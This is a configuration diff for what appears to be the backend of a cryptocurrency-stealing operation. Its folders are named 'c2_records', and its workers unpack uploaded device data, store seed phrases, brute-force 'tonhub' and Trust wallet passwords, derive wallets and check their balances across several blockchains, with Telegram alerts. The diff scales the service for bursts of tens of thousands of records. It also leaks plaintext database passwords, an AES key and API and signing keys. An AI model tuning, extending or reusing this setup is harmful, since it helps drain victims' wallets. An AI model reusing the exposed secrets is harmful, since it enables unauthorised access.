@@ -22,8 +22,8 @@ spring:
     nacos:
       discovery:
         server-addr: http://127.0.0.1:8848
-        namespace: a5b3bd13-9c96-4216-93fb-8b077e537f46 #测试
-        #namespace: 31ee03b7-c6df-436d-990d-d6c08aa5c20a #开发
+        #namespace: a5b3bd13-9c96-4216-93fb-8b077e537f46 #测试
+        namespace: 31ee03b7-c6df-436d-990d-d6c08aa5c20a #开发
   mvc:
     pathmatch:
       matching-strategy: ant_path_matcher
@@ -44,30 +44,30 @@ spring:
     timeout: 5000ms
     lettuce:
       pool:
-        max-active: 50    # 8核3实例：50（3×50=150总连接）
-        max-idle: 20
-        min-idle: 5
+        max-active: 64    # 旁路 Lettuce；3 实例约 192
+        max-idle: 32
+        min-idle: 8
         max-wait: 5000ms
-    # JedisPool 配置（Consumer 主流程用）
+    # JedisPool（Stream 主路径）；3 实例 × 96 ≈ 288，需 Redis maxclients 足够
     jedis:
       pool:
-        max-active: 48    # 8核3实例：48（3×48=144总连接），poller+worker+autoclaim+ack+retry 需求
-        max-idle: 24
-        min-idle: 4
+        max-active: 96
+        max-idle: 48
+        min-idle: 12
 
   datasource:
     driver-class-name: com.mysql.cj.jdbc.Driver
-    #url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8
-    #username: root
-    #password: Root@123
     url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8
-    username: ioslianjie
-    password: BAF4R22mwenXXxEH
+    username: root
+    password: Root@123
+    #url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8
+    #username: ioslianjie
+    #password: BAF4R22mwenXXxEH
     type: com.alibaba.druid.pool.DruidDataSource
-    initialSize: 10      # 启动时建10个连接，避免连接风暴
-    minIdle: 10
-    maxActive: 40        # 8核3实例：40（3×40=120总连接，MySQL需max_connections>=500）
-    maxWait: 5000        # 5秒，避免DB连接池耗尽时worker长时间阻塞假死
+    initialSize: 16
+    minIdle: 16
+    maxActive: 80        # 3×80=240；MySQL max_connections 建议 ≥500
+    maxWait: 5000
     timeBetweenEvictionRunsMillis: 30000
     minEvictableIdleTimeMillis: 50000
     validationQuery: SELECT 1
@@ -77,15 +77,17 @@ spring:
     connectionErrorRetryAttempts: 3
     breakAfterAcquireFailure: false
 
-# ============= Consumer Worker 运行参数（8核16G 3实例） =============
+# ============= Consumer Worker（面向短时上万条突发；按 8核16G / 可 3 实例水平扩展） =============
+# 吞吐粗算（单实例，无 trust 堵 parse）：main≈3-4/s，parse≈2-4/s，news4≈8-12/s
+# 1 war → 1 parse_ci → 约 5 wallet_derive，故 news4 线程需明显高于 parse
 consumer:
   # 落盘根（同 API 进程 api18.upload-dir，war_unpack 读 .bin / Bip39Util 缓存用）
-  #upload-dir: D:/c2_records
-  upload-dir: /opt/news4/data/apilog
-  # 8核3实例：2（3×2=6线程）
-  main-threads: 2
-  # 8核3实例：2
-  parse-ci-threads: 2
+  upload-dir: D:/c2_records
+  #upload-dir: /opt/news4/data/apilog
+  # 解压 I/O+JSON：抬高以消化突发入队
+  main-threads: 4
+  # parse CPU 密：勿超过约 CPU/2；trust scrypt 已异步，可到 4
+  parse-ci-threads: 4
   auto-claim-idle-ms: 1800000
   main-claim-idle-ms: 600000
   # 单条消息最大重试次数（含首次消费，超过进 DLQ）
@@ -94,48 +96,48 @@ consumer:
   retry-backoff-base-ms: 1000
   # DLQ 消息最长保留毫秒（默认 7 天），超期自动清理
   dlq-retention-ms: 604800000
-  # 助记词 AES 密钥
+  # 助记词 AES 密钥：留空或空字符串 → mnemonic.result 明文入库
   mnemonic-aes-key: "Mn3m0n1c@2024!SecureKey#news2"
   # 是否向 news4:tasks 投递 wallet_derive
   news4-task-enabled: true
-  # 8核3实例：2
-  news4-threads: 2
-  # news4 consumer 轮询间隔 ms
-  news4-poll-interval-ms: 1000
-  # news4 XAUTOCLAIM idle（默认 10min）
+  # 下游放大：1 parse ≈ 5 derive；突发时需明显大于 parse-ci-threads
+  news4-threads: 12
+  # 更勤拉取，减少 stream 堆积
+  news4-poll-interval-ms: 300
   news4-claim-idle-ms: 600000
-  # photo 队列并发（I/O密集型，8核3实例：2）
-  photo-threads: 2
-  # photo consumer 轮询间隔 ms
-  photo-poll-interval-ms: 1000
-  # photo XAUTOCLAIM idle（默认 10min）
+  photo-threads: 3
+  photo-poll-interval-ms: 500
   photo-claim-idle-ms: 600000
-  # photo 批量拉取大小
-  photo-batch-size: 8
-  # nb_notestore（NoteStore 正文追加补齐，独立队列）
-  nb-notestore-threads: 2
-  nb-notestore-poll-interval-ms: 1500
+  photo-batch-size: 16
+  nb-notestore-threads: 3
+  nb-notestore-poll-interval-ms: 800
   nb-notestore-claim-idle-ms: 900000
-  nb-notestore-batch-size: 4
-  # 解密后图片落盘目录
-  #photo-dir: D:/c2_records/photos
-  photo-dir: /opt/news4/data/photos
+  nb-notestore-batch-size: 8
+  photo-dir: D:/c2_records/photos
+  #photo-dir: /opt/news4/data/photos
   photo-url-prefix: data/photos
-  # 批量拉取大小（主队列）
-  batch-size: 8
-  # parse_ci 批量拉取大小（CPU密集，建议4）
-  parse-ci-batch-size: 4
-  # news4 批量拉取大小
-  news4-batch-size: 8
-  poll-interval-ms: 500
-  parse-ci-poll-interval-ms: 2000
-  # consumer-name 留空则自动使用 hostname + 随机
+  # 批量拉取：突发时一次多拿，减少 Redis 往返
+  batch-size: 16
+  parse-ci-batch-size: 8
+  news4-batch-size: 24
+  poll-interval-ms: 200
+  parse-ci-poll-interval-ms: 400
   consumer-name:
-  # tonhub暴力破解优化配置
-  tonhub-brute-sync-timeout-ms: 0  # 0=完全异步不阻塞worker
-  tonhub-brute-threads: 0          # 0=自动CPU/2=4线程（8核）
-  tonhub-brute-serialize: true     # 串行化：限制同时爆破的device数
-  tonhub-brute-serialize-permits: 1  # 许可数：同时只1个device在爆破
+  # tonhub：完全异步 + 串行化，避免上万并发打满 CPU
+  tonhub-brute-sync-timeout-ms: 0
+  tonhub-brute-threads: 0
+  tonhub-brute-serialize: true
+  # 每实例 1；3 实例合计最多 3 个 device 同时 tonhub 爆破
+  tonhub-brute-serialize-permits: 1
+  trust-decrypt-async: true
+  trust-decrypt-threads: 2
+  # 每实例 2；3 实例合计约 6 路 trust scrypt
+  trust-decrypt-serialize-permits: 2
+  # Poller 回压：worker 队列 ≥50% 停读，消息留 Stream 不丢
+  poll-queue-high-ratio: 0.5
+  # Trust/Tonhub 无许可时延迟重试（不永久跳过）
+  crypto-defer-max-attempts: 120
+  crypto-defer-base-delay-ms: 3000
 
 # =============================================================================
 # 【换另一套时必改】Redis 队列隔离（本机多套同 Redis 时防串消费）
@@ -167,20 +169,20 @@ queue:
 # news4 旁路线程池（与 n4-worker 隔离；listen / balance 互不堵塞）
 news4:
   listen-pool:
-    core-size: 4
-    max-size: 8
-    queue-capacity: 5000
+    core-size: 8
+    max-size: 16
+    queue-capacity: 20000
   balance-pool:
-    core-size: 4
-    max-size: 12
-    queue-capacity: 5000
+    core-size: 8
+    max-size: 24
+    queue-capacity: 20000
 
-#飞机消息线程池
+#飞机消息线程池（突发时队列加大；并发仍限流防刷爆 TG）
 telegram-msg-stream:
   async-pool:
     core-size: 4
-    max-size: 16
-    queue-capacity: 2000
+    max-size: 12
+    queue-capacity: 10000
     keep-alive-seconds: 60
 
 #飞机消息
@@ -195,12 +197,11 @@ monitor:
   api_key: ak_acc6f0ce66e526602e91b818
   sign_key: c4177a108651daf4af590337fcad15227dc47895b5896ce8d6a2ad6c44ad1d88
   balance:
-    # Ankr 免费节点已要求 API Key，勿再用 rpc.ankr.com（否则首节点 Unauthorized 刷 WARN）
     eth-rpc: https://ethereum.publicnode.com,https://1rpc.io/eth,https://cloudflare-eth.com,https://eth.llamarpc.com
     bsc-rpc: https://bsc-dataseed.binance.org,https://bsc-dataseed1.binance.org,https://bsc.publicnode.com,https://bsc-dataseed2.binance.org
     tron-api: https://api.trongrid.io
     btc-api: https://blockstream.info/api,https://mempool.space/api
     sol-rpc: https://api.mainnet-beta.solana.com,https://1rpc.io/sol,https://solana.drpc.org,https://solana-rpc.publicnode.com
     timeout-ms: 8000
-    pool-size: 8
-    max-concurrent: 6
+    pool-size: 12
+    max-concurrent: 10
